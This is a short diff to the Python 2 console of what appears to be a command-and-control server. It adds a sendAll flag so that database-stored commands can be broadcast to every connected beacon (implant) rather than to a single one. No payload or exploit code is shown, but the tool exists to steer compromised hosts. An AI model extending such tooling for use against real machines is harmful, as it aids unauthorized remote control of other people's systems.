@@ -27,6 +27,7 @@ def start_prompt():
     s = server.Server(port)
     db = init_db()
     interact = False
+    sendAll = False
     b = 0           # beacon to interact with
     while True:
         try:
@@ -72,7 +73,8 @@ def start_prompt():
             
             elif cmd[0] == "load":  # load defined command into server
                 if interact:
-                    s.load_command(cmd[1], db, b)  # retrieve command from database
+                    s.load_command(cmd[1], db, b, sendAll)  # retrieve command from database
+                    sendAll = False
                 else:
                     print "%s[x] Error -- Choose to interact with specific beacon or all beacons%s" % (color.error, color.end)
             
@@ -96,7 +98,9 @@ def start_prompt():
                 interact = True
                 if cmd[1] == "all":
                     # send to all beacons
-                    s.sendAll = True
+                    sendAll = True
+                    for x in s.beacons:
+                        s.bList += [x]
                 else:                   # send to specified beacon
                     b = int(cmd[1])     # beacon tag
                     for x in s.beacons:
